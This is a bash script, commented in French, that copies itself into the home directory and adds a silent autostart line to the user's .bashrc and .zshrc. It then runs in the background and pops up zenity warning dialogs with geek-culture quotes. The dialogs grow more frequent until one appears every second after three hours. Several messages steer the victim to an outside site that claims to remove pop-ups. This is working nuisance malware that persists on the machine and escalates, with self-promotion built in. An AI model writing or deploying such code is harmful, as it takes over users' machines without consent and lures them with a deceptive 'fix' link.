#!/bin/bash

# Nom du script pour se copier
SCRIPT_NAME="popup_script.sh"

# Chemin complet où le script sera copié
DEST_PATH="$HOME/$SCRIPT_NAME"

# Copier le script à la racine si ce n'est pas déjà fait
if [ ! -f $DEST_PATH ]; then
    cp "$0" $DEST_PATH
    chmod +x $DEST_PATH
fi

# Ajouter la commande pour exécuter le script au lancement de la session
AUTO_START_CMD="$DEST_PATH > /dev/null 2>&1 & disown"

# Fonction pour ajouter l'autostart au fichier shell de l'utilisateur
function add_to_startup {
    SHELL_CONFIG_FILE="$1"
    if [ -f "$SHELL_CONFIG_FILE" ]; then
        # Vérifie si la commande n'est pas déjà présente
        if ! grep -q "$AUTO_START_CMD" "$SHELL_CONFIG_FILE"; then
            echo "$AUTO_START_CMD" >> "$SHELL_CONFIG_FILE"
        fi
    fi
}

# Ajoute le script à .bashrc et .zshrc si disponibles
add_to_startup "$HOME/.bashrc"
add_to_startup "$HOME/.zshrc"

# Liste des messages
MESSAGES=(
    "There is no spoon. - Neo"
    "It's dangerous to go alone! Take this. - Old Man"
    "I find your lack of faith disturbing. - Darth Vader"
    "With great power comes great responsibility. - Uncle Ben"
    "Do or do not. There is no try. - Yoda"
    "Inconceivable! - Vizzini"
    "I'm sorry, Dave. I'm afraid I can't do that. - HAL 9000"
    "Live long and prosper. - Spock"
    "The cake is a lie. - GLaDOS"
    "Wibbly wobbly timey wimey. - The Doctor"
    "Resistance is futile. - The Borg"
    "I've seen things you people wouldn't believe. - Roy Batty"
    "Never tell me the odds! - Han Solo"
    "I am Groot. - Groot"
    "Kneel before Zod. - General Zod"
    "My precious. - Gollum"
    "Elementary, my dear Watson. - Sherlock Holmes"
    "To infinity and beyond! - Buzz Lightyear"
    "Why so serious? - The Joker"
    "May the Force be with you. - Various characters"
    "I'm the Doctor. - The Doctor"
    "Winter is coming. - Ned Stark"
    "Are you suggesting coconuts migrate? - King Arthur"
    "Nanu Nanu. - Mork"
    "Fear is the mind-killer. - Paul Atreides"
    "A wizard is never late, nor is he early. He arrives precisely when he means to. - Gandalf"
    "It's over 9000! - Vegeta"
    "I am the one who knocks! - Walter White"
    "Hasta la vista, baby. - The Terminator"
    "I solemnly swear that I am up to no good. - Fred and George Weasley"
    "Get rid of pop-ups: https://codekarma42.github.io/web/"
    "pop-ups problems? go to https://codekarma42.github.io/web/"
    "pop-ups are a pain, go to https://codekarma42.github.io/web/"
    "pop-ups are annoying, go to https://codekarma42.github.io/web/"
)

function show_random_message {
    RANDOM_INDEX=$(($RANDOM % ${#MESSAGES[@]}))
    MESSAGE=${MESSAGES[$RANDOM_INDEX]}
    zenity --warning --title="Geek Wisdom" --text="$MESSAGE" &
}

START_TIME=$(date +%s)

while true; do
    CURRENT_TIME=$(date +%s)
    ELAPSED_TIME=$((CURRENT_TIME - START_TIME))

    if [ $ELAPSED_TIME -lt 3600 ]; then
        DELAY=$(shuf -i 1-600 -n 1)
    elif [ $ELAPSED_TIME -lt 7200 ]; then
        DELAY=$(shuf -i 1-60 -n 1)
    elif [ $ELAPSED_TIME -lt 10800 ]; then
        DELAY=$(shuf -i 1-10 -n 1)
    else
        DELAY=1
    fi

    sleep $DELAY
    show_random_message
done > /dev/null 2>&1 &
disown
